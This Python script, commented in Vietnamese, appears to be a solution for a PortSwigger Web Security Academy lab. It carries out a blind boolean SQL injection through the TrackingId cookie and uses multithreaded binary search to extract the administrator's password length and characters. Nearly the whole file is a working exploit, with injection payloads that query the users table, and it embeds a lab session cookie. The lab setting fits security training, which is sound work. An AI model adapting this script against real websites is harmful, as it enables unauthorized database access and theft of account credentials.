import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== Cấu hình ==========
url = "https://0a4800880421e1a5801c4e22002100a7.web-security-academy.net/filter?category=Gifts"
tracking_id = "lJ7zrk9F9eKXrrjB"
session_id = "uPuAgcODYdwqJL14fiHmkGqynNfh29ro"

charset = string.ascii_lowercase + string.digits  # Chỉ dùng chữ thường và số
MAX_PASSWORD_LENGTH = 50
MAX_WORKERS = 10
REQUEST_TIMEOUT = 7

# Khởi tạo session giữ connection
s = requests.Session()
s.cookies.set("session", session_id)

# ========== Hàm gửi request ==========
def send_request(payload):
    cookies = {"TrackingId": tracking_id + payload}
    try:
        response = s.get(url, cookies=cookies, timeout=REQUEST_TIMEOUT)
        return "Welcome back!" in response.text
    except requests.exceptions.RequestException:
        return False

# ========== Tìm độ dài mật khẩu ==========
def find_password_length_binary_search():
    print("[+] Đang tìm độ dài mật khẩu...")
    low, high = 1, MAX_PASSWORD_LENGTH
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {mid}-- -"
        if send_request(payload):
            print(f"[✓] Độ dài mật khẩu: {mid}")
            return mid
        payload_gt = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) > {mid}-- -"
        if send_request(payload_gt):
            low = mid + 1
        else:
            high = mid - 1
    print("[-] Không tìm thấy độ dài mật khẩu.")
    return None

# ========== Tìm 1 ký tự tại vị trí i bằng binary search ==========
def find_single_char(position):
    low_ascii = ord(min(charset))
    high_ascii = ord(max(charset))
    
    found_char_ascii = None # Khởi tạo để tránh UnboundLocalError

    while low_ascii <= high_ascii:
        mid_ascii = (low_ascii + high_ascii) // 2
        
        # Chỉ kiểm tra điều kiện ">=" để thực hiện binary search
        payload_gte = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'), {position}, 1)) >= {mid_ascii}-- -"
        
        if send_request(payload_gte): 
            found_char_ascii = mid_ascii # Lưu lại ứng cử viên tốt nhất hiện tại
            low_ascii = mid_ascii + 1    # Tiếp tục tìm kiếm ở nửa trên
        else:
            high_ascii = mid_ascii - 1   # Tìm kiếm ở nửa dưới
    
    # Sau khi binary search kết thúc, found_char_ascii sẽ chứa giá trị ASCII của ký tự đúng
    if found_char_ascii is not None:
        found_char = chr(found_char_ascii)
        if found_char in charset:
            return found_char
    return None

# ========== Tìm toàn bộ mật khẩu ==========
def extract_password_multithreaded(length):
    print(f"[+] Bắt đầu dò mật khẩu dài {length} ký tự...")
    password_chars = [""] * length
    
    # Biến cờ để kiểm tra xem có bất kỳ ký tự nào không tìm được không
    all_chars_found = True 

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(find_single_char, i + 1): i for i in range(length)}
        for future in as_completed(futures):
            index = futures[future]
            position = index + 1
            result_char = future.result()
            if result_char:
                password_chars[index] = result_char
                print(f"[+] Ký tự {position}: {result_char} -> {''.join(password_chars[:position])}")
            else:
                # Nếu một ký tự không tìm thấy, đặt cờ và in ra thông báo lỗi
                all_chars_found = False 
                print(f"[-] KHÔNG THỂ TÌM THẤY ký tự tại vị trí {position}.")

    final_password = "".join(password_chars)
    
    # Chỉ kiểm tra cờ để quyết định mật khẩu có đầy đủ không
    if not all_chars_found:
        print("[!] Cảnh báo: Mật khẩu có thể chưa đầy đủ do một số ký tự bị bỏ lỡ.")
    
    return final_password

# ========== Main ==========
if __name__ == "__main__":
    password_length = find_password_length_binary_search()
    if password_length:
        final_password = extract_password_multithreaded(password_length)

        if len(final_password) == password_length:
            print(f"\n[✓] Mật khẩu cuối cùng: {final_password}")
        else:
            print("[-] Dò mật khẩu thất bại hoặc không đầy đủ.")
    else:
        print("[-] Không xác định được độ dài mật khẩu.")
